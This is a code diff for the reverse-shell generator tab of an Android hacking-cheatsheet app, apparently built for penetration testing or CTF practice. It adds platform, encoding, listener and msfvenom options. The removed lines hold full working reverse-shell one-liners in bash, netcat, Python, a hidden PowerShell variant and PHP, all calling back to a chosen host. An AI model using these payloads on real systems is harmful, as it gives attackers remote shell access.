@@ -26,11 +26,15 @@ import androidx.compose.foundation.lazy.LazyColumn
 import androidx.compose.foundation.rememberScrollState
 import androidx.compose.foundation.shape.RoundedCornerShape
 import androidx.compose.material.icons.Icons
+import androidx.compose.material.icons.filled.ArrowDropDown
 import androidx.compose.material.icons.filled.Check
 import androidx.compose.material.icons.filled.Clear
 import androidx.compose.material.icons.filled.ContentCopy
+import androidx.compose.material.icons.filled.Search
 import androidx.compose.material3.Button
 import androidx.compose.material3.ButtonDefaults
+import androidx.compose.material3.DropdownMenu
+import androidx.compose.material3.DropdownMenuItem
 import androidx.compose.material3.Icon
 import androidx.compose.material3.IconButton
 import androidx.compose.material3.MaterialTheme
@@ -41,6 +45,11 @@ import androidx.compose.material3.SwitchDefaults
 import androidx.compose.material3.Tab
 import androidx.compose.material3.TabRow
 import androidx.compose.material3.Text
+import com.hackingcheatsheets.app.data.MsfvenomPreset
+import com.hackingcheatsheets.app.data.PayloadEncoding
+import com.hackingcheatsheets.app.data.ReverseShellData
+import com.hackingcheatsheets.app.data.ShellPayloadItem
+import com.hackingcheatsheets.app.data.ShellPlatform
 import androidx.compose.runtime.Composable
 import androidx.compose.runtime.collectAsState
 import androidx.compose.runtime.getValue
@@ -135,19 +144,56 @@ fun CommandBuilderTab(
 fun ReverseShellGeneratorTab(language: AppLanguage) {
     var ip by remember { mutableStateOf("10.10.14.5") }
     var port by remember { mutableStateOf("4444") }
-    var selectedShell by remember { mutableStateOf("Bash -i") }
-    val shells = listOf("Bash -i", "Bash 196", "nc mkfifo", "Python3", "PowerShell", "PHP")
+    var selectedPlatform by remember { mutableStateOf(ShellPlatform.LINUX) }
+    var selectedCategory by remember { mutableStateOf("All") }
+    var searchQuery by remember { mutableStateOf("") }
+
+    val platformPayloads = remember(selectedPlatform) {
+        ReverseShellData.getPayloads(selectedPlatform)
+    }
+
+    var selectedPayload by remember(selectedPlatform) {
+        mutableStateOf<ShellPayloadItem>(platformPayloads.firstOrNull() ?: ReverseShellData.LINUX_PAYLOADS.first())
+    }
+
+    var selectedShell by remember(selectedPlatform) {
+        mutableStateOf(
+            if (selectedPlatform == ShellPlatform.WINDOWS || selectedPlatform == ShellPlatform.BIND_WINDOWS) "powershell"
+            else "/bin/bash"
+        )
+    }
+
+    var selectedEncoding by remember { mutableStateOf(PayloadEncoding.NONE) }
+    var selectedListenerTool by remember { mutableStateOf("nc") }
+    var selectedMsfPreset by remember { mutableStateOf<MsfvenomPreset>(ReverseShellData.MSFVENOM_PRESETS.first()) }
+    var payloadDropdownExpanded by remember { mutableStateOf(false) }
+
+    val categories = remember(selectedPlatform) {
+        listOf("All") + ReverseShellData.getCategories(selectedPlatform)
+    }
+
+    val filteredPayloads = remember(selectedPlatform, selectedCategory, searchQuery) {
+        platformPayloads.filter { item ->
+            val matchCategory = selectedCategory == "All" || item.category == selectedCategory
+            val matchSearch = searchQuery.isBlank() ||
+                item.name.contains(searchQuery, ignoreCase = true) ||
+                item.category.contains(searchQuery, ignoreCase = true)
+            matchCategory && matchSearch
+        }
+    }
 
     LazyColumn(
         modifier = Modifier.fillMaxSize(),
-        contentPadding = PaddingValues(bottom = 80.dp)
+        contentPadding = PaddingValues(bottom = 90.dp)
     ) {
         item {
+            // LHOST & LPORT
             Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                 OutlinedTextField(
                     value = ip,
                     onValueChange = { ip = it },
-                    label = { Text("LHOST (IP)") },
+                    label = { Text("LHOST / TARGET IP") },
+                    singleLine = true,
                     modifier = Modifier.weight(1.5f),
                     colors = OutlinedTextFieldDefaults.colors(
                         focusedBorderColor = CyberGreen,
@@ -160,6 +206,7 @@ fun ReverseShellGeneratorTab(language: AppLanguage) {
                     value = port,
                     onValueChange = { port = it },
                     label = { Text("LPORT") },
+                    singleLine = true,
                     modifier = Modifier.weight(1f),
                     colors = OutlinedTextFieldDefaults.colors(
                         focusedBorderColor = CyberGreen,
@@ -170,25 +217,81 @@ fun ReverseShellGeneratorTab(language: AppLanguage) {
                 )
             }
 
-            Spacer(modifier = Modifier.height(12.dp))
+            Spacer(modifier = Modifier.height(8.dp))
 
+            // Quick Ports
+            Row(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .horizontalScroll(rememberScrollState()),
+                horizontalArrangement = Arrangement.spacedBy(6.dp)
+            ) {
+                Text(
+                    text = if (language == AppLanguage.TR) "Portlar:" else "Ports:",
+                    color = TextMuted,
+                    fontSize = 11.sp,
+                    modifier = Modifier.padding(top = 4.dp, end = 2.dp)
+                )
+                listOf("4444", "9001", "1337", "80", "443", "8080", "53").forEach { p ->
+                    Box(
+                        modifier = Modifier
+                            .clip(RoundedCornerShape(6.dp))
+                            .background(if (port == p) CyberGreen.copy(alpha = 0.25f) else SurfaceVariantDark)
+                            .border(1.dp, if (port == p) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
+                            .clickable { port = p }
+                            .padding(horizontal = 8.dp, vertical = 4.dp)
+                    ) {
+                        Text(
+                            text = p,
+                            color = if (port == p) CyberGreen else TextSecondary,
+                            fontWeight = FontWeight.Bold,
+                            fontSize = 11.sp
+                        )
+                    }
+                }
+            }
+
+            Spacer(modifier = Modifier.height(14.dp))
+
+            // Platform Selector Tabs
+            Text(
+                text = if (language == AppLanguage.TR) "HEDEF PLATFORM & TÜR" else "TARGET PLATFORM & TYPE",
+                style = MaterialTheme.typography.labelMedium,
+                color = CyberGreen
+            )
+            Spacer(modifier = Modifier.height(6.dp))
             Row(
                 modifier = Modifier
                     .fillMaxWidth()
                     .horizontalScroll(rememberScrollState()),
                 horizontalArrangement = Arrangement.spacedBy(8.dp)
             ) {
-                shells.forEach { s ->
+                ShellPlatform.values().forEach { platform ->
+                    val isSelected = selectedPlatform == platform
                     Box(
                         modifier = Modifier
                             .clip(RoundedCornerShape(8.dp))
-                            .background(if (selectedShell == s) CyberGreen else SurfaceVariantDark)
-                            .clickable { selectedShell = s }
+                            .background(if (isSelected) CyberGreen else SurfaceVariantDark)
+                            .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(8.dp))
+                            .clickable {
+                                selectedPlatform = platform
+                                selectedCategory = "All"
+                                searchQuery = ""
+                                val newItems = ReverseShellData.getPayloads(platform)
+                                if (newItems.isNotEmpty()) {
+                                    selectedPayload = newItems.first()
+                                }
+                                if (platform == ShellPlatform.WINDOWS || platform == ShellPlatform.BIND_WINDOWS) {
+                                    selectedShell = "powershell"
+                                } else if (platform == ShellPlatform.LINUX || platform == ShellPlatform.BIND_LINUX) {
+                                    selectedShell = "/bin/bash"
+                                }
+                            }
                             .padding(horizontal = 12.dp, vertical = 8.dp)
                     ) {
                         Text(
-                            text = s,
-                            color = if (selectedShell == s) BackgroundDark else TextPrimary,
+                            text = platform.displayName,
+                            color = if (isSelected) BackgroundDark else TextPrimary,
                             fontWeight = FontWeight.Bold,
                             fontSize = 12.sp
                         )
@@ -196,25 +299,383 @@ fun ReverseShellGeneratorTab(language: AppLanguage) {
                 }
             }
 
-            Spacer(modifier = Modifier.height(16.dp))
+            Spacer(modifier = Modifier.height(14.dp))
 
-            val payload = when (selectedShell) {
-                "Bash -i" -> "bash -i >& /dev/tcp/$ip/$port 0>&1"
-                "Bash 196" -> "0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196"
-                "nc mkfifo" -> "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
-                "Python3" -> "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
-                "PowerShell" -> "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$ip\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
-                "PHP" -> "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
-                else -> "bash -i >& /dev/tcp/$ip/$port 0>&1"
+            if (selectedPlatform != ShellPlatform.MSFVENOM) {
+                // Category Filter
+                Text(
+                    text = if (language == AppLanguage.TR) "KATEGORİ" else "CATEGORY",
+                    style = MaterialTheme.typography.labelSmall,
+                    color = TextMuted
+                )
+                Spacer(modifier = Modifier.height(4.dp))
+                Row(
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .horizontalScroll(rememberScrollState()),
+                    horizontalArrangement = Arrangement.spacedBy(6.dp)
+                ) {
+                    categories.forEach { cat ->
+                        val isCatSelected = selectedCategory == cat
+                        Box(
+                            modifier = Modifier
+                                .clip(RoundedCornerShape(6.dp))
+                                .background(if (isCatSelected) TerminalCyan.copy(alpha = 0.2f) else SurfaceDark)
+                                .border(1.dp, if (isCatSelected) TerminalCyan else BorderDark, RoundedCornerShape(6.dp))
+                                .clickable { selectedCategory = cat }
+                                .padding(horizontal = 10.dp, vertical = 6.dp)
+                        ) {
+                            Text(
+                                text = cat,
+                                color = if (isCatSelected) TerminalCyan else TextSecondary,
+                                fontWeight = if (isCatSelected) FontWeight.Bold else FontWeight.Normal,
+                                fontSize = 11.sp
+                            )
+                        }
+                    }
+                }
+
+                Spacer(modifier = Modifier.height(10.dp))
+
+                // Search & Payload Picker
+                OutlinedTextField(
+                    value = searchQuery,
+                    onValueChange = { searchQuery = it },
+                    placeholder = { Text(if (language == AppLanguage.TR) "Payload ara (örn: mkfifo, ruby, pty)..." else "Search payloads (e.g., mkfifo, ruby)...") },
+                    leadingIcon = { Icon(Icons.Default.Search, contentDescription = null, tint = TextMuted) },
+                    trailingIcon = {
+                        if (searchQuery.isNotEmpty()) {
+                            IconButton(onClick = { searchQuery = "" }) {
+                                Icon(Icons.Default.Clear, contentDescription = null, tint = TextMuted)
+                            }
+                        }
+                    },
+                    singleLine = true,
+                    modifier = Modifier.fillMaxWidth(),
+                    colors = OutlinedTextFieldDefaults.colors(
+                        focusedBorderColor = CyberGreen,
+                        unfocusedBorderColor = BorderDark,
+                        focusedTextColor = TextPrimary,
+                        unfocusedTextColor = TextPrimary
+                    )
+                )
+
+                Spacer(modifier = Modifier.height(10.dp))
+
+                // Payload Dropdown / Selector Button
+                Text(
+                    text = if (language == AppLanguage.TR) "SEÇİLİ PAYLOAD (${filteredPayloads.size} Bulundu)" else "SELECTED PAYLOAD (${filteredPayloads.size} Found)",
+                    style = MaterialTheme.typography.labelSmall,
+                    color = TextMuted
+                )
+                Spacer(modifier = Modifier.height(4.dp))
+
+                Box(modifier = Modifier.fillMaxWidth()) {
+                    Row(
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .clip(RoundedCornerShape(8.dp))
+                            .background(SurfaceDark)
+                            .border(1.dp, BorderDark, RoundedCornerShape(8.dp))
+                            .clickable { payloadDropdownExpanded = true }
+                            .padding(horizontal = 14.dp, vertical = 12.dp),
+                        horizontalArrangement = Arrangement.SpaceBetween
+                    ) {
+                        Column(modifier = Modifier.weight(1f)) {
+                            Text(
+                                text = selectedPayload.name,
+                                color = CyberGreen,
+                                fontWeight = FontWeight.Bold,
+                                fontSize = 13.sp
+                            )
+                            Text(
+                                text = "${selectedPayload.category} • ${selectedPayload.platform.displayName}",
+                                color = TextMuted,
+                                fontSize = 11.sp
+                            )
+                        }
+                        Icon(
+                            Icons.Default.ArrowDropDown,
+                            contentDescription = null,
+                            tint = CyberGreen,
+                            modifier = Modifier.padding(start = 8.dp)
+                        )
+                    }
+
+                    DropdownMenu(
+                        expanded = payloadDropdownExpanded,
+                        onDismissRequest = { payloadDropdownExpanded = false },
+                        modifier = Modifier
+                            .fillMaxWidth(0.9f)
+                            .background(SurfaceDark)
+                    ) {
+                        filteredPayloads.forEach { item ->
+                            DropdownMenuItem(
+                                text = {
+                                    Column {
+                                        Text(
+                                            text = item.name,
+                                            color = if (selectedPayload.id == item.id) CyberGreen else TextPrimary,
+                                            fontWeight = if (selectedPayload.id == item.id) FontWeight.Bold else FontWeight.Normal,
+                                            fontSize = 12.sp
+                                        )
+                                        Text(
+                                            text = item.category,
+                                            color = TextMuted,
+                                            fontSize = 10.sp
+                                        )
+                                    }
+                                },
+                                onClick = {
+                                    selectedPayload = item
+                                    payloadDropdownExpanded = false
+                                }
+                            )
+                        }
+                    }
+                }
+
+                Spacer(modifier = Modifier.height(12.dp))
+
+                // Shell Interpreter & Encoding
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    horizontalArrangement = Arrangement.spacedBy(8.dp)
+                ) {
+                    // Shell Interpreter
+                    Column(modifier = Modifier.weight(1f)) {
+                        Text(
+                            text = if (language == AppLanguage.TR) "KABUK (SHELL)" else "SHELL",
+                            style = MaterialTheme.typography.labelSmall,
+                            color = TextMuted
+                        )
+                        Spacer(modifier = Modifier.height(4.dp))
+                        val shellOptions = if (selectedPlatform == ShellPlatform.WINDOWS || selectedPlatform == ShellPlatform.BIND_WINDOWS) {
+                            listOf("powershell", "cmd.exe")
+                        } else {
+                            listOf("/bin/bash", "/bin/sh", "/bin/zsh", "/bin/dash")
+                        }
+                        Row(
+                            modifier = Modifier
+                                .fillMaxWidth()
+                                .horizontalScroll(rememberScrollState()),
+                            horizontalArrangement = Arrangement.spacedBy(4.dp)
+                        ) {
+                            shellOptions.forEach { s ->
+                                val isShellSelected = selectedShell == s
+                                Box(
+                                    modifier = Modifier
+                                        .clip(RoundedCornerShape(6.dp))
+                                        .background(if (isShellSelected) CyberGreen.copy(alpha = 0.25f) else SurfaceDark)
+                                        .border(1.dp, if (isShellSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
+                                        .clickable { selectedShell = s }
+                                        .padding(horizontal = 8.dp, vertical = 6.dp)
+                                ) {
+                                    Text(
+                                        text = s,
+                                        color = if (isShellSelected) CyberGreen else TextSecondary,
+                                        fontWeight = FontWeight.Bold,
+                                        fontSize = 11.sp
+                                    )
+                                }
+                            }
+                        }
+                    }
+
+                    // Encoding
+                    Column(modifier = Modifier.weight(1f)) {
+                        Text(
+                            text = if (language == AppLanguage.TR) "KODLAMA (ENCODING)" else "ENCODING",
+                            style = MaterialTheme.typography.labelSmall,
+                            color = TextMuted
+                        )
+                        Spacer(modifier = Modifier.height(4.dp))
+                        Row(
+                            modifier = Modifier
+                                .fillMaxWidth()
+                                .horizontalScroll(rememberScrollState()),
+                            horizontalArrangement = Arrangement.spacedBy(4.dp)
+                        ) {
+                            PayloadEncoding.values().forEach { enc ->
+                                val isEncSelected = selectedEncoding == enc
+                                Box(
+                                    modifier = Modifier
+                                        .clip(RoundedCornerShape(6.dp))
+                                        .background(if (isEncSelected) CyberGreen.copy(alpha = 0.25f) else SurfaceDark)
+                                        .border(1.dp, if (isEncSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
+                                        .clickable { selectedEncoding = enc }
+                                        .padding(horizontal = 8.dp, vertical = 6.dp)
+                                ) {
+                                    Text(
+                                        text = enc.displayName,
+                                        color = if (isEncSelected) CyberGreen else TextSecondary,
+                                        fontWeight = FontWeight.Bold,
+                                        fontSize = 11.sp
+                                    )
+                                }
+                            }
+                        }
+                    }
+                }
+
+                Spacer(modifier = Modifier.height(16.dp))
+
+                // Generated Payload Box
+                val generatedPayload = remember(selectedPayload, ip, port, selectedShell, selectedEncoding) {
+                    ReverseShellData.generatePayload(
+                        item = selectedPayload,
+                        ip = ip,
+                        port = port,
+                        shell = selectedShell,
+                        encoding = selectedEncoding
+                    )
+                }
+
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    horizontalArrangement = Arrangement.SpaceBetween
+                ) {
+                    Text(
+                        text = if (language == AppLanguage.TR) "ÜRETİLEN PAYLOAD" else "GENERATED PAYLOAD",
+                        style = MaterialTheme.typography.labelLarge,
+                        color = CyberGreen
+                    )
+                    Text(
+                        text = "${generatedPayload.length} chars",
+                        style = MaterialTheme.typography.labelSmall,
+                        color = TextMuted
+                    )
+                }
+
+                Spacer(modifier = Modifier.height(4.dp))
+                CodeBlockView(code = generatedPayload, language = "bash")
+
+                if (selectedPayload.notes.isNotBlank()) {
+                    Spacer(modifier = Modifier.height(6.dp))
+                    Box(
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .clip(RoundedCornerShape(6.dp))
+                            .background(SurfaceDark)
+                            .border(1.dp, BorderDark, RoundedCornerShape(6.dp))
+                            .padding(8.dp)
+                    ) {
+                        Text(
+                            text = "💡 ${selectedPayload.notes}",
+                            color = TextSecondary,
+                            fontSize = 11.sp
+                        )
+                    }
+                }
+
+                Spacer(modifier = Modifier.height(16.dp))
+
+                // Listener Section
+                Text(
+                    text = if (language == AppLanguage.TR) "HAZIR DİNLEYİCİ (LISTENER)" else "READY LISTENER COMMAND",
+                    style = MaterialTheme.typography.labelLarge,
+                    color = TerminalCyan
+                )
+                Spacer(modifier = Modifier.height(6.dp))
+
+                Row(
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .horizontalScroll(rememberScrollState()),
+                    horizontalArrangement = Arrangement.spacedBy(6.dp)
+                ) {
+                    ReverseShellData.LISTENER_TOOLS.forEach { tool ->
+                        val isToolSelected = selectedListenerTool == tool
+                        Box(
+                            modifier = Modifier
+                                .clip(RoundedCornerShape(6.dp))
+                                .background(if (isToolSelected) TerminalCyan.copy(alpha = 0.2f) else SurfaceVariantDark)
+                            .border(1.dp, if (isToolSelected) TerminalCyan else BorderDark, RoundedCornerShape(6.dp))
+                            .clickable { selectedListenerTool = tool }
+                            .padding(horizontal = 10.dp, vertical = 6.dp)
+                        ) {
+                            Text(
+                                text = tool,
+                                color = if (isToolSelected) TerminalCyan else TextSecondary,
+                                fontWeight = FontWeight.Bold,
+                                fontSize = 11.sp
+                            )
+                        }
+                    }
+                }
+
+                Spacer(modifier = Modifier.height(6.dp))
+                val listenerCmd = remember(selectedListenerTool, port, ip) {
+                    ReverseShellData.generateListener(selectedListenerTool, port, ip)
+                }
+                CodeBlockView(code = listenerCmd, language = "bash")
+
+            } else {
+                // MSFVenom Mode
+                Text(
+                    text = if (language == AppLanguage.TR) "MSFVENOM HAZIR ŞABLONLARI" else "MSFVENOM PRESETS",
+                    style = MaterialTheme.typography.labelMedium,
+                    color = CyberGreen
+                )
+                Spacer(modifier = Modifier.height(6.dp))
+
+                Row(
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .horizontalScroll(rememberScrollState()),
+                    horizontalArrangement = Arrangement.spacedBy(6.dp)
+                ) {
+                    ReverseShellData.MSFVENOM_PRESETS.forEach { preset ->
+                        val isPresetSelected = selectedMsfPreset.id == preset.id
+                        Box(
+                            modifier = Modifier
+                                .clip(RoundedCornerShape(8.dp))
+                                .background(if (isPresetSelected) CyberGreen.copy(alpha = 0.25f) else SurfaceVariantDark)
+                                .border(1.dp, if (isPresetSelected) CyberGreen else BorderDark, RoundedCornerShape(8.dp))
+                                .clickable { selectedMsfPreset = preset }
+                                .padding(horizontal = 10.dp, vertical = 8.dp)
+                        ) {
+                            Column {
+                                Text(
+                                    text = preset.name,
+                                    color = if (isPresetSelected) CyberGreen else TextPrimary,
+                                    fontWeight = FontWeight.Bold,
+                                    fontSize = 12.sp
+                                )
+                                Text(
+                                    text = "${preset.platform} • .${preset.extension}",
+                                    color = TextMuted,
+                                    fontSize = 10.sp
+                                )
+                            }
+                        }
+                    }
+                }
+
+                Spacer(modifier = Modifier.height(14.dp))
+
+                val msfPair = remember(selectedMsfPreset, ip, port) {
+                    ReverseShellData.generateMsfvenom(selectedMsfPreset, ip, port)
+                }
+
+                Text(
+                    text = if (language == AppLanguage.TR) "MSFVENOM KOMUTU" else "MSFVENOM GENERATION COMMAND",
+                    style = MaterialTheme.typography.labelLarge,
+                    color = CyberGreen
+                )
+                Spacer(modifier = Modifier.height(4.dp))
+                CodeBlockView(code = msfPair.first, language = "bash")
+
+                Spacer(modifier = Modifier.height(12.dp))
+
+                Text(
+                    text = if (language == AppLanguage.TR) "METASPLOIT TEK SATIR DİNLEYİCİ" else "METASPLOIT ONE-LINER HANDLER",
+                    style = MaterialTheme.typography.labelLarge,
+                    color = TerminalCyan
+                )
+                Spacer(modifier = Modifier.height(4.dp))
+                CodeBlockView(code = msfPair.second, language = "bash")
             }
-
-            Text(
-                text = if (language == AppLanguage.TR) "ÜRETİLEN TERS KABUK (PAYLOAD)" else "GENERATED REVERSE SHELL",
-                style = MaterialTheme.typography.labelLarge,
-                color = CyberGreen
-            )
-            Spacer(modifier = Modifier.height(4.dp))
-            CodeBlockView(code = payload, language = selectedShell)
         }
     }
 }
